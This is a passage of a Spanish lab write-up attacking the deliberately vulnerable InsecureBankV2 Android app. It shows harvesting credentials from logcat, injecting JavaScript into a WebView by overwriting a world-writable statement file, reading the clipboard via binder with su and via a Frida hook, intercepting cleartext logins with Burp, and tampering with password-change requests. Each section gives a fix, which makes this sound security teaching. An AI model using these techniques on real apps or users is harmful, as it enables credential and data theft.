**Corrección**: trata la detección de root como un badén, no como una defensa. Las comprobaciones críticas para la seguridad (integridad de transacciones, protección de claves) deben imponerse en el lado servidor o en hardware (Keystore, attestation), donde un hook en tiempo de ejecución no puede alcanzarlas.

## Logging Inseguro

**Objetivo**: cosechar credenciales de la salida de logs de la app.

Varios sitios del código escriben en el log de Android. `DoLogin`, en un login exitoso, registra el usuario y la contraseña en claro:

```java
if (DoLogin.this.result.indexOf("Correct Credentials") != -1) {
    Log.d("Successful Login:", ", account=" + DoLogin.this.username + ":" + DoLogin.this.password);
}
```

`pidcat` (un wrapper de `logcat` por app) filtra el flujo de logs solo hasta esta app. Loguearse como `jack` mientras corre imprime las credenciales directamente en el terminal:

```bash
ander@monre:~/mobileHack/InsecureBankV2$ pidcat com.android.insecurebankv2
      Successful Login:  D  , account=jack:Jack@123$
```

Tu intuición sobre quién puede ver esto importa aquí. Desde **Android 4.1**, una app de terceros ya no puede leer los logs de otra app sin permiso a nivel de sistema — así que el ataque de "cualquier app lee el log" que existía antes de Jelly Bean ha desaparecido. Pero el dato sensible sigue expuesto a: cualquiera con acceso físico y depuración USB (como se ha mostrado), apps corriendo con root, y dispositivos antiguos o con aislamiento débil donde la separación de logs es imperfecta. La severidad depende del contexto del dispositivo, pero escribir secretos en el log es un fallo de diseño en sí mismo — **CWE-532: Insertion of Sensitive Information into Log File**.

**Corrección**: nunca registres credenciales ni datos sensibles. Elimina el logging de depuración de las builds de release — envuelve las llamadas a `Log` en `if (BuildConfig.DEBUG)` o deja que R8/ProGuard las eliminen en tiempo de compilación.

## WebView Inseguro y Almacenamiento Externo

**Objetivo**: lograr la ejecución de JavaScript dentro del WebView de la app sobrescribiendo un fichero que carga desde almacenamiento externo escribible por cualquiera.

La actividad `ViewStatement` carga un extracto HTML en un WebView, desde **almacenamiento externo**, con JavaScript habilitado:

```java
mWebView.loadUrl("file://" + Environment.getExternalStorageDirectory() + "/Statements_" + this.uname + ".html");
```

Dos problemas se combinan. El almacenamiento externo (`/storage/emulated/0/`) es legible y escribible por cualquier app (y por adb), así que el fichero que el WebView renderiza no está bajo el control exclusivo de la app. Y el JavaScript está habilitado en el WebView, así que cualquier script en ese fichero se ejecuta. Primero confirmé la ruta exacta disparando una transferencia y observando el log, que imprime la ubicación vía `System.out`:

```bash
       cr_LibraryLoader  I  Loaded native library version number "83.0.4103.120"
       TetheringManager  I  registerTetheringEventCallback:com.android.insecurebankv2
             System.out  I  /storage/emulated/0/Statements_jack.html
```

El fichero vive en `/storage/emulated/0/Statements_jack.html`. Como es escribible por cualquiera, lo reemplacé con mi propio HTML conteniendo un payload de JavaScript — un simple `alert()` como prueba de ejecución — y lo empujé por adb:

```bash
ander@monre:~/mobileHack/InsecureBankV2$ cat Statements_jack.html
<script>alert("HTML malipulado!");</script>

ander@monre:~/mobileHack/InsecureBankV2$ adb push Statements_jack.html /storage/emulated/0/
Statements_jack.html: 1 file pushed, 0 skipped. 0.1 MB/s (44 bytes in 0.001s)
```

Pulsar "View Statement" ahora carga mi fichero y ejecuta el script:

![WebView renderizando el HTML inyectado y lanzando el diálogo alert de JavaScript](/assets/img/Mobile/InsecureBankv2/cap9.png)

El `adb push` aquí solo simula al atacante real: una segunda app maliciosa en el dispositivo con permiso de escritura en almacenamiento externo. Sobrescribe el fichero del extracto, y la próxima vez que la víctima abra su extracto, el JavaScript del atacante corre **dentro del contexto del WebView de la app bancaria** — donde, según la configuración del WebView (`setAllowFileAccess`, cualquier bridge `addJavascriptInterface`), puede alcanzar los ficheros privados de la app o los métodos Java expuestos. Se comporta como un XSS almacenado, pero la causa raíz es la carga insegura de contenido, no una inyección del lado servidor.

**Corrección**: nunca cargues contenido ejecutable desde almacenamiento externo. Empaqueta las plantillas de extractos dentro del almacenamiento privado de la app, deshabilita el JavaScript en el WebView salvo que sea estrictamente necesario (`setJavaScriptEnabled(false)`), y nunca expongas bridges nativos a contenido no confiable.

## Exposición del Portapapeles / Pasteboard

**Objetivo**: leer datos que el usuario copió dentro de la app desde el portapapeles compartido del sistema — y observar cómo Android moderno lo mitiga.

El portapapeles de Android es global y compartido entre apps. Históricamente cualquier app podía instanciar un `ClipboardManager` y leer lo último que el usuario había copiado — en una app bancaria, eso son números de cuenta, importes, a veces contraseñas. Para probarlo, copié un número de cuenta (`5555555`) dentro de la pantalla de transferencia, obtuve el UID de Linux de la app, e intenté leer el portapapeles mediante la llamada de bajo nivel al servicio binder, suplantando a la app con `su`:

```bash
ander@monre:~/mobileHack/InsecureBankV2$ adb shell ps | grep "insecure"
u0_a130        3343    424 12801312 227504 ep_poll   72b6ff63a90a S com.android.insecurebankv2

ander@monre:~/mobileHack/InsecureBankV2$ adb shell su u0_a130 service call clipboard 1 s16 com.android.insecurebankv2
Result: Parcel(
  0x00000000: fffffffd 00000008 006f004e 00690020 '........N.o. .i.'
  0x00000010: 00650074 0073006d 00000000 00000318 't.e.m.s.........'
  ...
  '...at com.android.server.clipboard.ClipboardService...setPrimaryClip(...)'
  '...at android.os.Binder.execTransact(Binder.java:1123)' )
```

El `service call clipboard` invoca directamente el servicio de sistema del portapapeles por binder: `su u0_a130` corre con el UID de la app (del output de `ps` de arriba), y `s16 <pkg>` escribe el nombre del paquete que llama como string UTF-16 en el parcel. Pero el parcel devuelto no es texto del portapapeles — es un **stack trace**, la forma serializada de una `SecurityException` lanzada por `ClipboardService`. El `5555555` no aparece nunca.

Ese fallo es el resultado interesante. Desde **Android 10 (API 29)** en adelante, el portapapeles solo puede ser leído por la app que tiene el foco de ventana en ese momento, o por el método de entrada activo — precisamente para matar el ataque de sniffing del portapapeles en segundo plano. Suplantar el UID de la app con `su` ya no basta, porque el servicio comprueba además el foco en primer plano. La excepción que ves *es* la mitigación haciendo su trabajo. En el Android más antiguo usado en el walkthrough original, este mismo comando devolvía el texto copiado; en el Android 11 de aquí, está bloqueado.

Para observar realmente el valor en un dispositivo moderno, la lectura debe venir de la propia app (que sí tiene el foco). Un hook de Frida que instancia el propio `ClipboardManager` de la app lo lee sin disparar la `SecurityException`:

```javascript
Java.perform(function () {
    var ActivityThread = Java.use("android.app.ActivityThread");
    var context = ActivityThread.currentApplication().getApplicationContext();

    var ClipboardManager = Java.use("android.content.ClipboardManager");
    var clipboard = Java.cast(context.getSystemService("clipboard"), ClipboardManager);

    if (clipboard.hasPrimaryClip()) {
        var clip = clipboard.getPrimaryClip();
        console.log("[+] Clipboard: " + clip.getItemAt(0).getText());
    } else {
        console.log("[-] Clipboard is empty");
    }
});
```

El encuadre de capacidad frente a explotabilidad captura esto con claridad: la vulnerabilidad original del portapapeles (cualquier app lee los datos copiados) era real y seria, Android 10+ restringió las lecturas a la app con foco de modo que la vía `service call` ahora lanza `SecurityException`, y sigue siendo explotable solo en dispositivos antiguos o desde la propia app / un método de entrada malicioso.

**Corrección**: no coloques datos sensibles en el portapapeles. Si copiar/pegar un número de cuenta es realmente necesario, marca el `ClipData` como sensible (`ClipDescription.EXTRA_IS_SENSITIVE`) y límpialo tras un breve timeout en lugar de depender del usuario.

## Conexiones HTTP Inseguras

**Objetivo**: interceptar el tráfico de la app en claro enrutándolo a través de un proxy de interceptación.

La app habla con el backend AndroLab por HTTP plano, así que cualquiera en la ruta puede leer y modificar el tráfico. Monté Burp Suite como man-in-the-middle. El mecanismo es un único punto de encuentro — una IP y un puerto — configurado de forma idéntica en ambos lados: Burp *escucha* ahí, y el dispositivo *envía* ahí.

Creé un listener de proxy en Burp enlazado a la dirección de mi adaptador host-only (`192.168.56.1`) en un puerto elegido:

![Listener de proxy de Burp Suite enlazado a la dirección host-only 192.168.56.1](/assets/img/Mobile/InsecureBankv2/cap10.png)

Luego configuré un proxy manual en los ajustes de Wi-Fi del emulador apuntando a la *misma* IP y puerto:

![Proxy Wi-Fi manual de Android apuntando a la dirección host-only y al puerto de Burp](/assets/img/Mobile/InsecureBankv2/cap11.png)

La única dirección que importa es la IP del host en la red host-only — va idéntica en los dos sitios. Con ambos configurados, cada petición que hace la app se enruta a través de Burp. Loguearse revela las credenciales en texto plano en el cuerpo de la petición:

![Burp interceptando la petición POST /login con usuario y contraseña en claro](/assets/img/Mobile/InsecureBankv2/cap12.png)

La petición capturada muestra exactamente por qué HTTP es inaceptable para autenticación:

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: 192.168.56.1:8888

username=jack&password=Jack%40123%24
```

Las credenciales (`jack` / `Jack@123$`, URL-encoded) viajan en claro. Cualquier atacante en la misma red — un punto de acceso rogue, un router comprometido, ARP spoofing en una Wi-Fi pública — las lee sin tocar el dispositivo. Esto funciona limpiamente aquí precisamente porque el tráfico no está cifrado; si la app hubiera usado HTTPS, la interceptación requeriría además instalar el certificado CA de Burp en el dispositivo y, en una app fortificada, derrotar el certificate pinning.

**Corrección**: usa HTTPS para todo el tráfico, imponlo con una network security config que prohíba el texto claro (`cleartextTrafficPermitted="false"`), e implementa certificate pinning para los endpoints sensibles.

## Manipulación de Parámetros y Enumeración de Usuarios

**Objetivo**: cambiar la contraseña de otro usuario manipulando la petición, y enumerar nombres de usuario válidos a partir de las respuestas diferentes.

La funcionalidad de Change Password envía al servidor el nombre de usuario objetivo y la nueva contraseña. Como ese nombre de usuario lo aporta el cliente y el servidor no lo verifica contra la sesión autenticada, interceptar la petición en Burp e intercambiar el nombre de usuario cambia la contraseña de un usuario *diferente* — un fallo directo de manipulación de parámetros / control de acceso roto.

La misma petición alimenta un ataque de enumeración de usuarios. Enviada al Intruder de Burp con el nombre de usuario como posición de payload Sniper y un diccionario de nombres de usuario candidatos, las respuestas difieren según si la cuenta existe: un nombre de usuario válido (como `jack`) devuelve una respuesta de éxito, mientras que uno inexistente (como `admin`) devuelve un error. El estado o la longitud de la respuesta se convierten en un oráculo fiable de qué nombres de usuario son reales — una lista que un atacante luego alimenta a ataques de contraseña contra los endpoints que *sí* verifican credenciales.

**Corrección**: deriva el usuario objetivo de la sesión autenticada en el lado servidor, nunca de un parámetro de la petición. Devuelve respuestas uniformes independientemente de si una cuenta existe, para que el endpoint no filtre nada sobre los nombres de usuario válidos.

## Conclusiones Clave

- **Los componentes exportados son un bypass de autenticación esperando a ocurrir.** Una actividad, provider o receiver marcado `exported="true"` puede ser invocado por cualquier app del dispositivo, ignorando el flujo que se suponía debía precederlo. La autorización tiene que imponerse dentro de cada componente, nunca asumirse a partir del orden en que se alcanzan las pantallas.

- **Los flags y comprobaciones del lado cliente no son una frontera de seguridad.** El recurso `is_admin`, el enrutamiento del backdoor `devadmin` y los métodos de detección de root viven todos en código que el atacante puede leer y reescribir. Cualquier decisión que un cliente tome sobre sus propios privilegios puede invertirse reempaquetando o instrumentando en tiempo de ejecución — la frontera real es el servidor.

- **El cifrado con clave hardcodeada e IV estático es ofuscación, no criptografía.** Una clave distribuida dentro de cada APK es una clave pública, y un IV constante hace que textos planos idénticos produzcan textos cifrados idénticos. Almacenar secretos así equivale a almacenarlos en claro para cualquiera que lea la clase. Usa el Android Keystore con claves por dispositivo, y no almacenes contraseñas de forma recuperable en absoluto.

- **Un artefacto sensible, muchas puertas sin proteger.** La base de datos de usuarios y las credenciales almacenadas en esta app son alcanzables a través del content provider, `adb backup` y `run-as` de forma independiente. Fortificar una app móvil significa cerrar cada camino hacia el dato, no solo el más obvio — un único `debuggable=true` o `allowBackup=true` olvidado deshace todo lo demás.

- **Los flags del manifest cargan un riesgo desproporcionado y pertenecen al CI.** `debuggable=true` y `allowBackup=true` son errores de una línea con radios de impacto grandes, y ambos se atrapan trivialmente con análisis estático. Un gate en tiempo de build que los rechace no cuesta nada y previene toda la clase de exfiltración vía `run-as` / backup.

- **Capacidad no es lo mismo que explotabilidad, y ambas pertenecen al informe.** Los fallos de backup, portapapeles y logging están todos mitigados en distinto grado en Android moderno (restricciones de backup en 12+, comprobaciones de foco del portapapeles en Android 10+, aislamiento de logs post-4.1). El finding honesto declara el fallo de diseño subyacente *y* las condiciones dependientes de la versión bajo las que es realmente explotable, en lugar de gritar crítico o descartarlo de plano.

- **El HTTP en claro y el logging en claro exponen credenciales a atacantes que nunca tocan el código de la app.** El HTTP plano entrega las contraseñas a cualquiera en la ruta de red; loguearlas las entrega a cualquiera que pueda leer el buffer de logs. Ambos se eliminan con disciplina — HTTPS con una network config que prohíba el texto claro, y no loguear secretos en primer lugar.
